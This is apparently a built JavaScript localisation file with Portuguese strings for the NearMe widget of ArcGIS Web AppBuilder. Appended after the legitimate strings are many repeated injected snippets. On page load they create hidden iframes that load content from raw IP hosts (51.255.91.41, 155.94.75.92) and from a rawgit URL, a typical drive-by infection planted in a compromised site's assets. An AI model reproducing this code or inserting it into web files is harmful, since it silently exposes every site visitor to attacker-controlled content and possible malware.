// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Milhas",acronym:"mi"},kilometers:{displayText:"Quil\u00f3metros",acronym:"km"},feet:{displayText:"P\u00e9s",acronym:"ft"},meters:{displayText:"Metros",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Defini\u00e7\u00f5es de Fonte de Pesquisa",searchSourceSettingTitle:"Defini\u00e7\u00f5es de Fonte de Pesquisa",searchSourceSettingTitleHintText:"Adicione e configure servi\u00e7os de geocodifica\u00e7\u00e3o ou camadas de elementos como fontes de pesquisa. Estas fontes determinam aquilo que \u00e9 poss\u00edvel pesquisar na caixa de pesquisa.",
addSearchSourceLabel:"Adicionar Fonte de Pesquisa",featureLayerLabel:"Camada de Elementos",geocoderLabel:"Geocodificador",nameTitle:"Nome",generalSettingLabel:"Configura\u00e7\u00e3o Geral",allPlaceholderLabel:"Texto de placeholder para pesquisar todos:",allPlaceholderHintText:"Dica: Introduzir o texto a exibir como espa\u00e7o reservado ao pesquisar todas as camadas e o geocodificador",generalSettingCheckboxLabel:"Exibir janela pop-up para o elemento ou local encontrado.",countryCode:"C\u00f3digo(s) de Pa\u00eds ou Regi\u00e3o",
countryCodeEg:"e.g ",countryCodeHint:"Ao deixar este valor em branco ir\u00e1 pesquisar em todos os pa\u00edses e regi\u00f5es",questionMark:"?",searchInCurrentMapExtent:"Procurar apenas na extens\u00e3o de mapa actual.",zoomScale:"Escala de Zoom",locatorUrl:"Geocoder URL",locatorName:"Nome do Geocoder",locatorExample:"Exemplo",locatorWarning:"Esta vers\u00e3o do servi\u00e7o de geocodifica\u00e7\u00e3o n\u00e3o \u00e9 suportada. O widget suporta servi\u00e7o de geocodifica\u00e7\u00e3o 10.0 e posterior.",
locatorTips:"Sugest\u00f5es n\u00e3o est\u00e3o dispon\u00edveis porque o servi\u00e7o de geocodifica\u00e7\u00e3o n\u00e3o suporta a capacidade sugerida.",layerSource:"Camada Fonte",setLayerSource:"Definir Fonte de Camada",setGeocoderURL:"Definir URL Geocodificador",searchLayerTips:"Sugest\u00f5es n\u00e3o est\u00e3o dispon\u00edveis porque o servi\u00e7o de elemento n\u00e3o suporta capacidades de pagina\u00e7\u00e3o.",placeholder:"Local de introdu\u00e7\u00e3o de texto",searchFields:"Campos de Pesquisa",
displayField:"Exibir Campo",exactMatch:"Correspond\u00eancia Exacta",maxSuggestions:"Sugest\u00f5es M\u00e1ximas",maxResults:"Resultados M\u00e1ximos",enableLocalSearch:"Ativar pesquisa local",minScale:"Escala M\u00ednima",minScaleHint:"Quando a escala do mapa \u00e9 superior a esta escala, ser\u00e1 aplicada a pesquisa local",radius:"Raio",radiusHint:"Especifica o raio de uma \u00e1rea em torno do atual centro do mapa, que \u00e9 utilizada para impulsionar a classifica\u00e7\u00e3o de candidatos a geocodifica\u00e7\u00e3o para que os candidatos que se encontram mais perto do local sejam apresentados nas primeiras posi\u00e7\u00f5es.",
meters:"Metros",setSearchFields:"Definir Campos de Pesquisa",set:"Definir",fieldName:"Nome",invalidUrlTip:"O URL ${URL} \u00e9 inv\u00e1lido ou inacess\u00edvel."},searchSetting:{searchSettingTabTitle:"Configura\u00e7\u00f5es da Pesquisa",defaultBufferDistanceLabel:"Definir dist\u00e2ncia predefinida do buffer",maxResultCountLabel:"Limitar o n\u00famero de resultados",maxResultCountHintLabel:"Dica: Defina o n\u00famero m\u00e1ximo de resultados vis\u00edveis. O valor 1 ir\u00e1 apresentar o elemento mais pr\u00f3ximo.",
maxBufferDistanceLabel:"Definir dist\u00e2ncia m\u00e1xima do buffer",bufferDistanceUnitLabel:"Unidades de distancia buffer",defaultBufferHintLabel:"Dica: Defina valor predefinido para o controlo deslizante de buffer",maxBufferHintLabel:"Dica: Definir valor m\u00e1ximo para o controlo deslizante de buffer",bufferUnitLabel:"Sugest\u00e3o: Definir unidade para cria\u00e7\u00e3o de buffer",selectGraphicLocationSymbol:"S\u00edmbolo de endere\u00e7o ou localiza\u00e7\u00e3o",graphicLocationSymbolHintText:"Sugest\u00e3o: S\u00edmbolo para endere\u00e7o pesquisado ou localiza\u00e7\u00e3o clicada",
addressLocationPolygonHintText:"Dica: S\u00edmbolo para camada de pol\u00edgonos pesquisada",popupTitleForPolygon:"Selecionar pol\u00edgono para localiza\u00e7\u00e3o de endere\u00e7o selecionada",popupTitleForPolyline:"Selecionar linha para localiza\u00e7\u00e3o de endere\u00e7o",addressLocationPolylineHintText:"Dica: S\u00edmbolo para camada de polilinhas pesquisada",fontColorLabel:"Seleccionar cor de fonte para resultados de pesquisa",fontColorHintText:"Sugest\u00e3o: Cor de fonte para resultados de pesquisa",
zoomToSelectedFeature:"Aplique zoom ao elemento selecionado.",zoomToSelectedFeatureHintText:"Dica: Aplicar zoom ao elemento selecionado ao inv\u00e9s de aplicar ao buffer",intersectSearchLocation:"Apresente pol\u00edgono(s) em interce\u00e7\u00e3o",intersectSearchLocationHintText:"Dica: Apresentar pol\u00edgono(s) que cont\u00eam a localiza\u00e7\u00e3o pesquisada ao inv\u00e9s de pol\u00edgonos no interior do buffer",enableProximitySearch:"Ativar pesquisa de proximidade",enableProximitySearchHintText:"Pista: Ativa a funcionalidade de pesquisar locais nas proximidades de um resultado selecionado",
bufferVisibilityLabel:"Defina a visibilidade do buffer",bufferVisibilityHintText:"Dica: O buffer ser\u00e1 exibido no mapa.",bufferColorLabel:"Defina o s\u00edmbolo do buffer",bufferColorHintText:"Dica: Selecione cor e transpar\u00eancia do buffer",searchLayerResultLabel:"Apenas representar resultados de camadas selecionadas",searchLayerResultHint:"Dica: Apenas a camada selecionada nos resultados de pesquisa ser\u00e1 representada no mapa",showToolToSelectLabel:"Bot\u00e3o Definir Localiza\u00e7\u00e3o",
showToolToSelectHintText:"Dica: Introduz um bot\u00e3o para definir a localiza\u00e7\u00e3o no mapa, ao inv\u00e9s de definir a localiza\u00e7\u00e3o sempre que se clica no mapa.",geoDesicParamLabel:"Utilizar buffer geod\u00e9sico",geoDesicParamHintText:"Dica: Utilize um buffer geod\u00e9sico ao inv\u00e9s de um buffer euclideano (planar)"},layerSelector:{selectLayerLabel:"Camada(s) de pesquisa seleccionada",layerSelectionHint:"Sugest\u00e3o: Ise o bot\u00e3o de defini\u00e7\u00e3o para camada(s) seleccionadas",
addLayerButton:"Definir"},routeSetting:{routeSettingTabTitle:"Defini\u00e7\u00f5es de Dire\u00e7\u00e3o",routeServiceUrl:"Servi\u00e7o de Roteamento",buttonSet:"Definir",routeServiceUrlHintText:"Dica: Clique em \u00e2\u20ac\u02dcSet\u00e2\u20ac\u2122 para navegar e selecione um servi\u00e7o de rotas",directionLengthUnit:"Unidades de comprimento de direc\u00e7\u00e3o",unitsForRouteHintText:"Sugest\u00e3o: Usado para exibir unidade para roteamento",selectRouteSymbol:"Seleccionar s\u00edmbolo para exibir rota",
routeSymbolHintText:"Sugest\u00e3o: Usado para exibir s\u00edmbolo linha da rota",routingDisabledMsg:"Para ativar direc\u00e7\u00f5es certifique-se de que o roteamento est\u00e1 ativo no item nas defini\u00e7\u00f5es da aplica\u00e7\u00e3o."},symbologySetting:{symbologySettingTabTitle:"Defini\u00e7\u00f5es de Simbologia",addSymbologyBtnLabel:"Adicionar Novos S\u00edmbolos",layerNameTitle:"Nome da Camada",fieldTitle:"Campo",valuesTitle:"Valores",symbolTitle:"S\u00edmbolo",actionsTitle:"A\u00e7\u00f5es",
invalidConfigMsg:"Duplicar campo: ${fieldName} para a camada : ${layerName}"},filterSetting:{filterSettingTabTitle:"Defini\u00e7\u00f5es de Filtro",addTaskTip:"Adicione um ou mais filtros \u00e0(s) camada(s) de pesquisa selecionadas e configure par\u00e2metros para cada um.",enableMapFilter:"Remova a camada de filtro predefinida do mapa",newFilter:"Novo filtro",filterExpression:"Filtrar express\u00e3o",layerDefaultSymbolTip:"Utilizar o s\u00edmbolo predefinido da camada",uploadImage:"Carregar uma imagem",
selectLayerTip:"Por favor, selecione uma camada.",setTitleTip:"Por favor, defina o t\u00edtulo.",noTasksTip:'N\u00e3o se encontram configurados quaisquer filtros. Clique em "${newFilter}" para adicionar um novo.',collapseFiltersTip:"Recolher as express\u00f5es de filtro (caso existam) quando o widget \u00e9 aberto"},networkServiceChooser:{arcgislabel:"Adicionar de ArcGIS Online",serviceURLabel:"Adicionar URL de Servi\u00e7o",routeURL:"URL de rota",validateRouteURL:"Validar",exampleText:"Exemplo",
hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Por favor especifique o servi\u00e7o de Roteamento v\u00e1lido.",rateLimitExceeded:"Limite de classifica\u00e7\u00e3o ultrapassado. Por favor tente mais tarde.",errorInvokingService:"Nome de utilizador ou palavra-passe incorreto."},errorStrings:{bufferErrorString:"Por favor especifique um valor num\u00e9rico v\u00e1lido.",
selectLayerErrorString:"Por favor seleccione camada(s) para pesquisar.",invalidDefaultValue:"A distancia buffer por omiss\u00e3o n\u00e3o pode estar em branco. Por favor especifique a distancia buffer",invalidMaximumValue:"Distancia m\u00e1xima buffer n\u00e3o pode estar em branco. Por favor especifique a distancia buffer",defaultValueLessThanMax:"Por favor especifique a distancia buffer por omiss\u00e3o dentro do limite m\u00e1ximo",defaultBufferValueGreaterThanOne:"A dist\u00e2ncia predefinida para o buffer n\u00e3o pode ser menor do que 0",
maximumBufferValueGreaterThanOne:"Por favor especifique a distancia buffer m\u00e1xima maior do que 0",invalidMaximumResultCountValue:"Por favor, especifique um valor v\u00e1lido para a contagem m\u00e1xima de resultados",invalidSearchSources:"Defini\u00e7\u00f5es inv\u00e1lidas de origem de pesquisa."},symbolPickerPreviewText:"Visualizar:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});